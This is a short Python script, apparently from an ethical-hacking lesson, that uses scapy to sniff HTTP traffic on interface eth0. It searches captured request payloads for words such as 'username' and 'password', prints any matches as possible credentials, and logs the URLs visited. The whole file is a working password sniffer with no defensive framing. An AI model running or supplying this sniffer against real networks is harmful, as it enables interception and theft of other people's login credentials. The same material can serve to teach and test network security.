#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # in filter argument we can specifiy a port or a protocol
    # store argument - not to store packets
    # prn argument - callback function

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # to filter layers
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            elements = ["uname", "username", "user", "pass", "password", "login"]
            for element in elements:
                if element in load:
                    print("[+] possible usernames and passwords : "+load)
                    break

        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] url : " + str(url))
        #
        # headers = packet[http.HTTPRequest].Headers
        # print("[+] user-agent : " + headers)


sniff("eth0")
